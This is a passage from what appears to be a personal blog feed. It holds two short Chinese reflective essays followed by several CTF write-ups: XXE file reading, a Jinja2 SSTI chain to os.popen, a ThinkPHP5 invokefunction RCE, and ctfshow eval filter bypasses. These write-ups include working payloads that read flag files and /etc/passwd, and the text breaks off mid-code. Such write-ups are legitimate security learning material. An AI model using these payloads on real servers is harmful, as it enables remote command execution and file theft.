title="关于哲学与道理"></a>关于哲学与道理</h2><p>非常同意您所说的观点。哲学是一种关于生活的思考方式，它可以帮助我们更好地理解我们自己、我们的世界以及我们与之相处的方式。选择哪种哲学观念，实际上就是选择我们想要过怎样的生活。</p><p>道理可以被看作是哲学的碎片，它是哲学思考的产物，是人们在生活中所总结出来的一些经验和智慧。这些道理往往简短易懂，适用于日常生活，可以帮助我们做出正确的决策和选择。</p><p>虽然哲学和道理的概念不同，但它们是相互关联的。哲学提供了道理的思想基础，而道理则为哲学提供了实际应用的示例和证明。</p><p>最后，您所说的“思考哲学的人始终为少数”这一点也非常正确。然而，无论我们是否选择深入思考哲学，我们都可以从中获得启示和灵感，以帮助我们更好地理解自己和这个世界。</p><h2 id="关于泛滥的道理"><a href="#关于泛滥的道理" class="headerlink" title="关于泛滥的道理"></a>关于泛滥的道理</h2><p>您提出的观点非常有趣，确实每个人都有自己的哲学和生活方式，而环境的影响对于动物和人都非常重要。而人类的创造历史和保存的道理，确实是一种宝贵的财富，可以帮助我们理解自己和世界的更多方面。然而，您也指出了一个问题，即现代哲学的发展相对缓慢，而道理泛滥的现象也存在。虽然现代信息的发展和文化交流使得人们可以更方便地获取和分享知识，但同时也带来了信息的过载和质量的下降。因此，我们需要更加注重筛选和思考所接触到的信息，以及积极地运用道理和哲学思维，来帮助自己更加智慧地生活。</p><h2 id="关于稀有的觉悟"><a href="#关于稀有的觉悟" class="headerlink" title="关于稀有的觉悟"></a>关于稀有的觉悟</h2><p>我认同你的看法，思考出一个真正有智慧的道理需要更多的深思熟虑和自我反省，这些思考过程需要借助丰富的阅历、知识和经验积累，也需要个人的觉悟和启发。同时，在古代社会中，人们更注重精神层面的修炼和人生哲学，这也让古代智者更能够思考出有深度的道理。</p><p>而现代社会中，信息量巨大，人们更加注重表面的知识和技能，也更倾向于追求即时性和短期利益，这些因素让“心灵鸡汤”等浅薄的道理更容易被接受和传播。当然，这并不是说现代社会缺乏真正有智慧的人，只是真正有智慧的声音被掩盖在了嘈杂的信息海洋中，需要更多的耐心和深入的探索才能找到。</p><p>最后，觉悟的获得确实是一个非常个体化和复杂的过程，需要个人经历、情感和信仰等多方面的因素共同作用。每个人的觉悟路径都是独特的，需要自己不断探索和领悟。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不过Chat GPT很多时候的态度都是赞同或者说认为有趣，并不能指出文章的缺陷，如果需要指出缺陷，需要叫它用最严厉的批判态度来评价这篇文章。<br>不过，我自知文章还有很多缺陷，毕竟只是花了半个多小时写就，论证不足，概念和定义还不够清晰。问题在于，我并没有那么多时间来完善，也只能留给以后的自己来完善咯。<br>想写日记来着，却写成了这样……<br>就这样吧。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/1.png&quot; alt=&quot;yuru camp&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>无法</title>
    <link href="http://example.com/2023/02/09/Diary_20230209/"/>
    <id>http://example.com/2023/02/09/Diary_20230209/</id>
    <published>2023-02-08T16:00:00.000Z</published>
    <updated>2023-02-09T14:54:11.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常常会想，如果再给我一次重来人生的机会，我会做得更好。</p><span id="more"></span><h1 id="错误的想法"><a href="#错误的想法" class="headerlink" title="错误的想法"></a>错误的想法</h1><p>即便重来人生，也不一定比现在更好。<br>提前买btc或有潜力的股票之类的，只不过是根据已经确定的事实做出的行动，并不是自身决心下行动的结果。只要想不付出代价大量敛财，任何一个重生的人都能做到这一点，不是么？那么又如何能证明，自己有重生的价值呢？倘若自身没有任何改进之处，那么即便重来恐怕也不会好到哪里去。</p><p>人就是这样，总喜欢把外物当作自身的一部分，无论是钱、名誉抑或他者。因此从奢入俭难，习惯了把外物当作自身的东西，当失去时会像割肉一样痛。重生后根据已确定的事实敛聚外物的结果，并没有让自身变得更好，只会增加变得更好的幻象。</p><h1 id="不再回望"><a href="#不再回望" class="headerlink" title="不再回望"></a>不再回望</h1><p>幻想之所以是幻想，是因为不需要付出巨大的时间精力。活在幻想中的人是无趣的。个人的幻想通常是基于自身的经历过往，也即为所有带有遗憾的过去，因为如果过去是完美的，也没必要幻想了。我想，正是对以前的自己的经历不满意，才想要幻想着有更美好的经历。</p><p>活在幻想中是一种停止前进的标志。幻想通常能帮助人减轻现实的苦楚，以此缓和对现实的不满，而减少去改变的行动力。行动力不足，于是满足现状，得过且过。人只要活着，就像身后有海啸追逐，被追上了会被吞噬。驻足回望是停下脚步，也会离海啸更近。也许有的人离海啸很远，一生都不会被追上。但那不是我，我需要不断前进来远离被吞噬的海浪。</p><h1 id="当下"><a href="#当下" class="headerlink" title="当下"></a>当下</h1><p>很多人幻想重生，有很大一部原因是由于重生能够起到重来一次的效果。然而，现实也同样有着类似的效果，在上一个假期没有达成的目标，这一个假期依然可以去做。而不是幻想着如果上一个假期能够重来就好了。总是幻想着上一次的重来，而放弃了在这一次的奋斗，那么终究只会陷入悲哀的漩涡中。<br>虽然现实不能在真正意义上重来，但是现实是有着一次又一次“重来”的效果。每一天都是24小时，每一周都是7天，每一月都是30天左右，每一年都是365天左右。如果昨天没做好，没关系，可以今天做好，而不是哀叹如果昨天能重来就好了。</p><p>大部分事情在现实中是能够“重来”的，也有少部分是不能重来的。比如重要之人的逝世，那么唯一能做的，就是在还没有失去之前，珍惜珍重。不要因为害羞逃避排斥而白白抛弃了真正重要的事物。有的人离别，是不会说再见的。</p><p>想要在现实中“重来”，只需要每天都进步，那么自己的遗憾必然会一天比一天少，一年比一年少。当然，每天都在进步，是很困难的。那么放宽要求，每年都在进步，这样沉浸在幻想中的时间必定会更少，对现实的自己也会更满意。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;常常会想，如果再给我一次重来人生的机会，我会做得更好。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-BUU XXE COURSE 1</title>
    <link href="http://example.com/2023/01/20/BUUCTF-BUU%20XXE%20COURSE%201/"/>
    <id>http://example.com/2023/01/20/BUUCTF-BUU%20XXE%20COURSE%201/</id>
    <published>2023-01-19T16:00:00.000Z</published>
    <updated>2023-01-20T14:17:15.387Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做的第一道XXE外部实体注入。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>根据题目可知，是XXE漏洞类型的题目。<br>打开页面是一个表单，我们先抓包。<br>送到Repeater后，从响应包可以发现，只有username得到返回，于是我们需要对username进行注入。<br>然后在语句 <code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code> 之下写入这段语句：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>并在标签username内部写入 <code>&amp;admin;</code><br>响应拿到flag</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;做的第一道XXE外部实体注入。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="XXE" scheme="http://example.com/categories/CTF/XXE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="XXE" scheme="http://example.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-Web_python_template_injection</title>
    <link href="http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_python_template_injection/"/>
    <id>http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Web_python_template_injection/</id>
    <published>2023-01-19T16:00:00.000Z</published>
    <updated>2023-01-20T12:30:08.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSTI注入是一种不算陌生的漏洞。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p> 首先看到题目，就知道这道题是关于 <strong>模板注入</strong> 的，什么是模板注入呢？</p><ul><li>为了写 html 代码的时候方便，很多网站都会使用模板，先写好一个 html 模板文件，<br>比如：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">code = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%(code)</span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></li></ul><p> 这段代码中的 <code>html</code> 就是一个简单的模板文件，当开发者想要这个模板对应的样式时，可以直接用 <code>render_template_string</code> 方法来调用这个模板，从而直接把这个样式渲染出来。<br>而模板注入，就是指 <strong>将一串指令代替变量传入模板中让它执行</strong> ，以这段代码为例，我们在传入 <code>code</code> 值时，可以用 <code>&#123;&#123;&#125;&#125;</code> 符号来包裹一系列代码，以此替代本应是参数的 <code>id</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://..../?id=&#123;&#123;代码&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>知道了什么是模板文件，接下来开始模板注入环节:<br>首先，先测试一下是不是确实能注入，构造一个简单的测试 url:<br><code>http://111.198.29.45:46675/&#123;&#123;7*7&#125;&#125;</code> 服务器回传：<br><code>URL http://111.198.29.45:46675/49 not found</code><br><code>/49</code> 的存在说明 <code>7*7</code> 这条指令被忠实地执行了。<br>接下来，开始想办法编代码拿到服务器的控制台权限：</li><li>首先，题目告诉我们这是一个 python 注入问题，那么脚本肯定也是 python 的，思考怎样用 python 语句获取控制台权限：想到了 <code>os.system</code> 和 <code>os.popen</code> (<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>), 这两句前者返回 <strong>退出状态码</strong> , 后者 <strong>以 file 形式</strong> 返回 <strong>输出内容</strong>, 我们想要的是内容，所所以选择 <code>os.popen</code> 。</li><li>知道了要用这一句，那么我要怎么找到这一句呢？python 给我们提供了完整的寻找链(<a href="https://www.cnblogs.com/tr1ple/p/9415641.html">参考资料</a>)：</li><li><code>__class__</code> ： 返回对象所属的类<br><code>__mro__</code> ： 返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br><code>__base__</code> ： 返回该类所继承的基类<br>&#x2F;&#x2F; <code>__base__</code> 和 <code>__mro__</code> 都是用来寻找基类的<br><code>__subclasses__</code> ： 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__init__</code> ： 类的初始化方法<br><code>__globals__</code> ： 对包含函数全局变量的字典的引用</li><li>首先，找到当前变量所在的类：<br><code>111.198.29.45:46675/%7B%7B&#39;&#39;.__class__%7D%7D</code> 服务器回复：<br><code>URL http://111.198.29.45:46675/&lt;type &#39;str&#39;&gt; not found</code> 发现这个回复里已经告诉我们 这个变量的类是 ‘str’ 了。</li><li>接下来，从这个类找到它的基类：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__%7D%7D</code> 服务器回复：<br><code>URL http://111.198.29.45:46675/(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;) not found</code> 发现基类也有了。</li><li>然后，通过基类来找其中任意一个基类的引用列表：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()%7D%7D</code> 这里有个小细节，<code>__mro__[]</code> 中括号里填谁其实区别都不大，这些基类引用的东西都一样。<br>服务器回复了很长的一个列表，我就不列举了，从其中可以找到我们想要的 <code>os</code> 所在的 <code>site._Printer</code> 类，它在列表的第七十二位，<br>即 <code>__subclasses__()[71]</code> 。</li><li>通过 <code>__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;命令行语句&#39;).read()</code> 来 <strong>调用服务器的控制台</strong> <strong>并显示</strong> ，这下我们就可以随便用控制台输出了。<br>直接填命令语句：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()%7D%7D</code> 注意这里的 <code>popen(&#39;ls&#39;).read()</code> ,意思是 <strong>得到 ls 的结果并读取给变量</strong> ，因此它会把当前目录所有文件都打印在我们的网页上，内容如下：<br><code>URL http://111.198.29.45:46675/fl4g index.py not found</code> 从这里我们看到，flag 存在一个叫 <code>fl4g</code> 的无后缀文件里，那就好办了，再<br>构造一个 payload，用 <code>cat</code> 读一下内容：<br><code>http://111.198.29.45:46675/%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read()%7D%7D</code><br>服务器回复：<br><code>URL http://111.198.29.45:46675/ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125; not found</code><br>成功拿到flag</li></ul><h2 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h2><ul><li>&#96;&#96;&#96;python<br>‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[71].<strong>init</strong>.<strong>globals</strong>[‘os’].popen(‘cat fl4g’).read()<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">以上 payload 是一个非常常用的 payload，同样常用的还有</span><br><span class="line">```python</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>和<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;SSTI注入是一种不算陌生的漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="SSTI" scheme="http://example.com/categories/CTF/SSTI/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="SSTI" scheme="http://example.com/tags/SSTI/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-php_rce</title>
    <link href="http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/"/>
    <id>http://example.com/2023/01/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-php_rce/</id>
    <published>2023-01-19T16:00:00.000Z</published>
    <updated>2023-01-20T13:06:25.397Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一道关于ThinkPHP5框架的命令执行漏洞。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>查资料<br>打开页面后，发现是一个ThinkPHP5框架。<br>在GitHub上搜索，“ThinkPHP5 漏洞” 找到可以利用的类似payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p>成功打开phpinfo界面，说明payload有效。</p></li><li><p>构造payload<br>由于我们是需要找到flag，那么就构造能够显示payload的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.105:63034/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /f*</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一道关于ThinkPHP5框架的命令执行漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="RCE" scheme="http://example.com/categories/CTF/RCE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-web入门-命令执行</title>
    <link href="http://example.com/2023/01/16/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2023/01/16/ctfshow-web%E5%85%A5%E9%97%A8-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-01-15T16:00:00.000Z</published>
    <updated>2023-01-16T12:53:52.361Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前进，前进，不能停下脚步！</p><span id="more"></span><h1 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法很多，和没过滤差不多</p></li><li><p>构造payload<br>有很多种绕过方式，以下随意列举几种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac f*`;</span><br><span class="line">?c=system(&#x27;tac f*&#x27;);</span><br><span class="line">?c=echo `nl fl&#x27;&#x27;ag.php`;</span><br></pre></td></tr></table></figure></li></ol><h1 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法还是很多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br></pre></td></tr></table></figure></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `tac f*`;</span><br><span class="line">?c=echo `cat f*`;</span><br><span class="line">?c=echo `more f*`;</span><br><span class="line">?c=echo `less f*`;</span><br><span class="line">?c=echo `head -n 20 f*`;</span><br><span class="line">?c=echo `tail -n 20 f*`;</span><br></pre></td></tr></table></figure></li></ol><h1 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次对空格进行了过滤，那么可以代替空格的有：<br><code>&lt;  &lt;&gt;  %09(tab)  $IFS$9  $&#123;IFS&#125;</code></p></li><li><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=echo(`tac%09f*`);    // 在这里能使用的只有%09</span><br><span class="line">?c=echo(`tac\$&#123;IFS&#125;f*`);    // 要记得加转义字符</span><br><span class="line">?c=echo(`tac\$IFS\$9f*`);</span><br><span class="line">?c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);   // 可以采用这种嵌套的方式绕过过滤</span><br><span class="line">?c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>过滤了括号，所以要用不需要括号的函数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo 123;</span><br><span class="line">print 123;</span><br><span class="line">die;</span><br><span class="line">include &quot;/etc/passwd&quot;;</span><br><span class="line">require &quot;/etc/passwd&quot;;</span><br><span class="line">include_once &quot;/etc/passwd&quot;;</span><br><span class="line">require_once &quot;etc/passwd&quot;;</span><br></pre></td></tr></table></figure>过滤了分号（;），可以使用 <code>?&gt;</code> 代替</li></ol><p>使用php伪协议将include包含的文件在页面上显示出来</p><ol start="2"><li>构造payload<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>页面显示base64编码的内容，解码可得flag</li></ol><p>或者也可以使用data伪协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=data:text/plain,&lt;?= `tac flag.php`;?&gt;</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><h1 id="web33-36"><a href="#web33-36" class="headerlink" title="web33-36"></a>web33-36</h1><ol><li><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| 